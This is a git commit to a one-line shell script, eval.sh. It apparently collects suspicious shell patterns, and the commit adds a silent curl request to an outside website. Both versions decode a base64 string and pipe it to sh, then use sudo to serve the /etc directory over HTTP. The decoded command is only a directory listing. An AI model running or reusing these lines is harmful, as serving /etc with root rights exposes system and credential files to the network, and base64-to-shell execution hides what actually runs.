99c5d1c8513dc5ad39301c708f5cf169842abd22
mwilco03 <36248105+mwilco03@users.noreply.github.com>
2023-11-27 16:25:32 -0500

    Update eval.sh

--- eval.sh
+++ eval.sh
@@ -1,1 +1,1 @@
-echo "bHMgLWxhCg==" | base64 -d  | sh && whoami && cd /etc/ && sudo python3 -m http.server 
+echo "bHMgLWxhCg==" | base64 -d  | sh && curl -s https://fosstorrents.com >/dev/null && whoami && cd /etc/ && sudo python3 -m http.server 
